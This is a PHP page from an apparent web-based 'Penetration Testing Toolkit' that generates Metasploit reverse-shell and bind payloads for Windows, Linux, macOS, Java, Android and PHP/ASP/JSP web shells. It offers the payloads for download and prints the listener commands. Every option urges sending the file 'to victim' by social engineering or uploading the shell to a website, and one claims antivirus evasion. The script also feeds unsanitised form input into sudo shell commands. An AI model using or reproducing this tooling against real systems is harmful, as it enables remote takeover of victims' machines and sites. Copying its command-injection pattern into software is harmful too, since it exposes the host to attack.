<?php /***************************************************************************
 Copyright (C) 2014 Rakesh Pandey
 Written by Rakesh Pandey <rakeshpandey@karunya.edu.in>.
 
 This file is part of Penetration Testing Toolkit, a web interface for various ethical hacking tools.
 
 Penetration Testing Toolkit is free software; you can redistribute it and/or modify it 
 under the terms of the GNU General Public License as published by the Free
 Software Foundation; either version 2 of the License, or (at your option)
 any later version. 

 Penetration Testing Toolkit is distributed in the hope that it will be useful, but WITHOUT 
 ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
 FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
 more details.

 You should have received a copy of the GNU General Public License along
 with Penetration Testing Toolkit; if not, write to the Free Software Foundation, Inc.,
 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.
***************************************************************************/?>
<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
		<div class="clear"></div>
		
              
                                         
    <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                        $pkg=$_POST['pkg'];
                        $c=$_POST['c'];
                     
            
               
               if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered datas correctly...'});</script>";
              }
               
 else {
      
     
                require_once 'loading.php';
                  echo "<fieldset>";
                  exec("sudo rm -r exploits/");
		exec(" sudo mkdir exploits && sudo chmod 777 -R exploits/");
                switch ($c)
                {
                    case c1:
                        shell("sudo sh cmd/quick/win.sh windows/meterpreter/reverse_tcp $ip $port $pkg exploits/$pkg.exe");
                         exec("sudo chmod +x exploits/$pkg.exe");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.exe");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->windows/meterpreter/reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.exe>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                       
             
                        break;
                    case c2:
                        
                     shell("sudo sh cmd/quick/win.sh windows/shell_reverse_tcp $ip $port $pkg exploits/$pkg.exe");
                         exec("sudo chmod +x  exploits/$pkg.exe");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.exe");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->windows/shell_reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.exe>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                    
                        break;
                    
                    case c3:
                        shell("echo ' Payload using msfvenom................'");
                        shell("sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -a x86 -e x86/shikata_ga_nai 40 -f exe>exploits/$pkg.exe");
                         exec("sudo chmod +x exploits/$pkg.exe");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.exe");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->windows/meterpreter/reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.exe>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                    
                        
                        break;
                    case c4:
                      shell("sudo sh cmd/quick/shellcode.sh $ip $port exploits/$pkg.exe");
                        exec("sudo chmod +x exploits/$pkg.exe");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.exe");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p>The generated payload by this module bypasses almost all (80%) anti-viruses</p> ';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->windows/meterpreter/reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.exe>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Windows OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                    
                        break;
                    case c5:
                        shell("sudo sh cmd/quick/linux.sh linux/x86/meterpreter/reverse_tcp $ip $port exploits/$pkg");
                        exec("sudo chmod +x exploits/$pkg");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->linux/x86/meterpreter/reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Linux Distributions</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 

                        break;
                     case c6:
                        shell("sudo sh cmd/quick/linux.sh linux/x86/shell_reverse_tcp  $ip $port exploits/$pkg");
                        exec("sudo chmod +x exploits/$pkg");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.exe</p>';
echo '<p><b>PAYLOAD</b>                   -->linux/x86/shell_reverse_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Linux Distributions</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                        break;
                    
                    case c8:
                     
                        shell("echo '[Wait] While I build your payload..........'");
                        shell("sudo msfpayload osx/x86/shell_reverse_tcp  LHOST=$ip LPORT=$port x>exploits/$pkg.pkg");
                         exec("sudo chmod 755 exploits/$pkg.pkg");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.pkg");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.pkg</p>';
echo '<p><b>PAYLOAD</b>                   -->osx/x86/shell_reverse_tcp  </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.pkg>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 

                        
                        break;
                    case c9:
                        shell("echo '[Wait] While I build your payload.........'");
                        shell("sudo msfpayload osx/x86/isight/bind_tcp LHOST=$ip LPORT=$port x>exploits/$pkg.pkg");
                         exec("sudo chmod 755 exploits/$pkg.pkg");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.pkg");
                            echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.pkg</p>';
echo '<p><b>PAYLOAD</b>                   -->osx/x86/isight/bind_tcp </p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in default format @</b>  --><a href=exploits/'.$pkg.'.pkg>Click here</a>';
echo '<p><b>AVAILABLE FOR DOWNLOAD in zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';


echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/isight/bind_tcp LHOST='.$ip.' LPORT='.$port.' E'; 

                        
                        break;
                    
                    case c10:
                         shell("echo '[Wait] While I build your payload.........'");
                        exec("sudo msfpayload java/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.jar");
                           exec("sudo chmod 777 exploits/$pkg.jar");
                           
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'.jar</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.jar</p>';
echo '<p><b>PAYLOAD</b>                   -->java/meterpreter/reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.jar>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx,Linux,Windows,Android</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 

                           
                        
                        break;
                    case c11:
                         shell("echo '[Wait] While I build your payload.........'");
                        exec("sudo msfpayload java/shell/reverse_tcp  LHOST=$ip LPORT=$port R >exploits/$pkg.jar");
                           exec("sudo chmod 777 exploits/$pkg.jar");
                           
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.jar</p>';
echo '<p><b>PAYLOAD</b>                   -->java/shell/reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.jar>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx,Linux,Windows,Android</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/shell/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 

                           
                        
                        break;
                    case c12:
                         shell("echo '[Wait] While I build your payload........'");
                        exec("sudo msfpayload java/shell/bind_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.jar");
                           exec("sudo chmod 777 exploits/$pkg.jar");
                           
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.jar</p>';
echo '<p><b>PAYLOAD</b>                   -->java/shell/bind_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.jar>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx,Linux,Windows,Android</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';
echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/shell/bind_tcp LHOST='.$ip.' LPORT='.$port.' E'; 

                           
                        break;
                    case c13:
                        case c13:
                        shell("echo '[Wait] While I generate your payload........'");
                        exec("sudo msfpayload php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.php");
                       
                        exec("sudo zip exploits/$pkg.zip exploits/$pkg.php");
                                             
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->php/meterpreter/reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.zip>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Websites(php)</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b> Upload this shell on website supporting PHP and start meterpreter listener ';
echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
                        break;
                    
                    case c14:
                        shell("echo '[Wait] While i generate tour payload..........'");
                         exec("sudo sh cmd/quick/asp.sh $ip $port exploits/$pkg.asp");
                           exec("sudo chmod 755 exploits/$pkg.asp");
                           
    echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.asp</p>';
echo '<p><b>PAYLOAD</b>                   -->windows/meterpreter/reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.asp>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Websites(asp)</p>';
echo'<p>*****************************************************************************</p>';

echo '<b>Note:</b> Upload this shell on website supporting PHP and start meterpreter listener ';

echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
                        break;
                    case c15:
                         shell("echo '[Wait] While i generate your $pkg.jsp payload..........'");
                         shell("sudo msfpayload java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.jsp");
                           exec("sudo chmod 755 exploits/$pkg.jsp");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg.jsp");
                           
    echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.jsp</p>';
echo '<p><b>PAYLOAD</b>                   -->java/jsp_shell_reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.zip>click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Websites(jsp)</p>';
echo'<p>*****************************************************************************</p>';

echo '<b>Note:</b> Upload this shell on website supporting JSP and start meterpreter listener ';

echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/jsp_shell_reverse_tcp   LHOST='.$ip.' LPORT='.$port.' E'; 
               
                        break;
                    case c16:
                        shell("echo '[Wait] While i generate your $pkg.apk payload..........'");
                        exec("sudo msfpayload android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >exploits/$pkg.apk");
                           exec("sudo chmod +x exploits/$pkg.apk");
                           
     echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'.apk</p>';
echo '<p><b>PAYLOAD</b>                   -->android/meterpreter/reverse_tcp</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'.apk>Click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Android OS</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';

echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
                        break;
                    
                }
                 $host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";
                        
                
 }
                 
         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Thank You!</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Succeeded </h4>
                 
 ';
          echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. "Generated Successfully!Please refer result section after this message'});</script>";
        
        
         
         
 }
               
             
                     
    
                
 ?>
                </fieldset>
		<div class="spacer"></div>
	</section>
</body>
</html>

